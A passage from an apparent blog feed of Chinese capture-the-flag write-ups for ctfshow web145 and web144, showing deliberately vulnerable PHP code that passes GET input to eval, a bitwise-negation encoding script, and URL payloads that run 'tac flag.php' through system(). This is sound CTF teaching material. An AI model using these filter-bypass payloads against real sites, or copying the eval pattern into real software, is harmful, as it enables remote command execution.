-*-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Author: h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Date:   2020-10-13 11:25:09&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified by:   h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified time: 2020-10-18 17:41:33&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&amp;#125;|\%|\&amp;amp;|\;|\&amp;lt;|\&gt;|\*|\/|\^|\#|\&#34;/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;get out hacker!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;return &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;/span&gt;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;/span&gt; = &#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;+、-、* 都被过滤了，^ 也被过滤了，那就使用 |，payload 使用取反&lt;/p&gt;
+&lt;h3 id=&#34;取反脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#取反脚本&#34;&gt;#&lt;/a&gt; 取反脚本&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;system&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tac flag.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;br&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;urlencode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;或&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?v1=1&amp;amp;v2=1&amp;amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F):
+&lt;/code&gt;&lt;/pre&gt;
+</content>
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/categories/ctfshow/" />
+        <category term="web145" scheme="http://m3k0mi.github.io/categories/ctfshow/web145/" />
+        <category term="ctfshow" scheme="http://m3k0mi.github.io/tags/ctfshow/" />
+        <updated>2024-05-27T08:01:54.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web144/</id>
+        <title>eval中的return-web144</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/05/27/eval%E4%B8%AD%E7%9A%84return-web144/"/>
+        <content type="html">&lt;h3 id=&#34;代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码&#34;&gt;#&lt;/a&gt; 代码&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/*&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# -*- coding: utf-8 -*-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Author: h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Date:   2020-10-13 11:25:09&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified by:   h1xa&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# @Last Modified time: 2020-10-18 16:21:15&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-casting&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;v3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/^\W+$/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;return &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v1&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v3&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$v2&lt;/span&gt;&lt;/span&gt;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token 